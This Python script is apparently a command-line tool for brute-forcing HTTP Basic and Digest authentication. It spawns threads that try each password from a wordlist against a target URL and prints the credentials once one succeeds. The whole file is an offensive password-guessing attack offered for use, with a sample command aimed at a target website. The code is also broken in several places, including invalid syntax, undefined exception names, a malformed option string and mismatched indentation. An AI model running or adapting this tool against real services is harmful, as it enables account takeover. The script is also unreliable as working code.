import requests
import sys
import time
import getopt
from threading import Thread
from requests.auth import HTTPDigestAuth



global hit = True

"""
Sample command to run this script : 
./digestauthenticationbrute.py -m basic -u admin -t 5 -f passworddict.txt -w "http://www.targetwebsite.com"

"""


class request_performer(Thread):
    def __init__(self, passwd, user, url, method):
        Thread.__init__(self)
        self.passwd = passwd
        self.user = user
        self.url = url
        self.method = method
        print("------" + passwd + "----------")
    
    def run(self):
        global hit
        if hit:
            try:
                if self.method == "basic":
                    r = requests.get(self.url , auth=(self.user, self.passwd))
                elif self.method == "digest":
                    r = requests.get(self.url , auth=HTTPDigestAuth(self.user, self.passwd))
                
                if r.status_code == 200:
                    hit = False
                    print("Username : " + self.user)
                    print("Password : " + self.passwd)
                    sys.exit()
                else:
                    print("Incorrect password: " + self.passwd)
                    i[0] -= 1
            except expression as identifier:
                print(identifier)

def start(argv):
    print("Base digest brute auth")

    if len(argv) < 5:
        print("Invalid number of args")
        sys.exit()
    
    try:
        """
        -u : user
        -w : url
        -f : file containing list of passwords
        -m : method
        -t : number of threads
        """
        opts, args = getopt.getopt(argv, 'u:w:m:f:t')
    except expression as identifier:
        print("Invalid argument types")

    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictionary = arg
        elif opt == '-m':
            method = arg
        else:
            threads = arg
        
    
    try:
        pFile = open(dictionary, 'r')
        passwords = pFile.readlines()
    except :
        print("Invalid file")
        sys.exit()
    
    launch_threads(passwords, threads, user, url, method)

def launch_threads(passwords, threads, user, url, method):
    global i
    i = []
    i.append(0)

    while len(passwords):
         if hit:
             try:
                 if i[0] < threads:
                    passwd = passwords.pop()
                    i[0] = i[0] + 1
                    thread = request_performer(passwd, user, url, method)
                    thread.start()
             except KeyboardInterrupt:
                 print("Keyboard interrupted")
                 sys.exit()
            thread.join()

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print('Keyboard intteruption')